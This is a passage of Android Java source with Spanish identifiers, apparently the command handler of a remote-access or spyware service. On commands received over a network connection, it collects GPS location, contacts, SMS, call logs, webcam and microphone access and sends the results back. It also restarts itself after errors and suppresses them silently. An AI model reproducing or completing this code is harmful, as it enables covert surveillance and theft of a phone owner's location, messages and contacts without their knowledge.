                                            Log.i("GPS", "Provedor desactivado: " + provider);
                                        }

                                        public void onProviderEnabled(String provider) {
                                            Log.i("GPS", "Provedor activado: " + provider);
                                        }

                                        public void onStatusChanged(String provider, int status, Bundle extras) {
                                            Log.i("GPS", "Provedor Status: " + status);
                                        }
                                    };
                                    locManager.requestLocationUpdates(provedorUbicacion, 0, 0, locListener);
                                    //obtengo la ultima localizacion conocida
                                    location = locManager.getLastKnownLocation(provedorUbicacion);
                                    break;
                                case Protocolo.desactivarGPS:
                                    try {
                                        locManager.removeUpdates(locListener);
                                    } catch (Exception e) {
                                    }
                                    break;
                                case Protocolo.pedirGPS:
                                    location = locManager.getLastKnownLocation(provedorUbicacion);
                                    if (location != null) {
                                        ubicacion = new GPSPosicion(location.getLatitude(), location.getLongitude(), location.getAltitude(), location.getSpeed(), location.getAccuracy(), location.getTime(), location.getProvider());
                                        Servicio.this.enviarComando(Protocolo.ubicacionGPS);
                                        Servicio.this.enviarObjeto(Servicio.this.comprimirObjecto(ubicacion));
                                    }
                                    break;
                                case Protocolo.listarProveedoresGPS:
                                    LocationManager locationManager = (LocationManager) contexto.getSystemService(Context.LOCATION_SERVICE);
                                    List<String> provedores = locationManager.getAllProviders();
                                    provedores.add("Mejor");
                                    Servicio.this.enviarComando(Protocolo.listarProveedoresGPS);
                                    Servicio.this.enviarObjeto(Servicio.this.comprimirObjecto(provedores));
                                    break;
                                case Protocolo.listarContactos:
                                    try {
                                        GestorContactos.listarContactos(Servicio.this, null);
                                    } catch (Exception e) {
                                    }
                                    break;
                                case Protocolo.listarSMS:
                                    try {
                                        GestorSMS.listarSMS(Servicio.this, null);
                                    } catch (Exception e) {
                                    }
                                    break;
                                case Protocolo.listarLlamadas:
                                    try {
                                        GestorLlamadas.listarLlamadas(Servicio.this, null);
                                    } catch (Exception e) {
                                    }
                                    break;
                            }
                        }
                    } catch (Exception ex) {
                        if (webC != null) {
                            webC.detener();
                            webC = null;
                        }
                        if (microfono != null) {
                            microfono.cerrar();
                            microfono = null;
                        }
                        try {
                            conexion.close();
                        } catch (Exception e) {
                        }
                        try {
                            enviarObjeto.close();
                        } catch (Exception e) {
                        }
                        try {
                            recibirObjeto.close();
                        } catch (Exception e) {
                        }
                        conectado = false;
                        destruido = true;
                    }
//                System.gc();
                }
            } catch (Exception e) {
                destruido = true;
                conectado = false;
                try {
                    Principal.instancia.iniciar();
                } catch (Exception e2) {
                }
            }
            destruido = true;
            conectado = false;
        }
    };
    public BroadcastReceiver mBroadcastReceiver = new BroadcastReceiver() {
        private static final String BCAST_CONFIGCHANGED = "android.intent.action.CONFIGURATION_CHANGED";

        @Override
        public void onReceive(Context context, Intent myIntent) {
            Log.d(TAG, "SE RECIBIO UN EVENTO");
            if (myIntent.getAction().equals(BCAST_CONFIGCHANGED)) {
                Log.d(TAG, "received->" + BCAST_CONFIGCHANGED);
                Servicio.this.setOrientacion(getResources().getConfiguration().orientation);
                if (getResources().getConfiguration().orientation == Configuration.ORIENTATION_LANDSCAPE) {
                    // it's Landscape                    
                    Log.d(TAG, "LANDSCAPE");
                } else {
                    Log.d(TAG, "PORTRAIT");
                }
            }
        }
    };

    public int getOrientacion() {
        return orientacion;
    }

    public void setOrientacion(int orientacion) {
        this.orientacion = orientacion;
    }

    public boolean isDestruido() {
        return destruido;
    }

    public void setDestruido(boolean destruido) {
        this.destruido = destruido;
    }
}
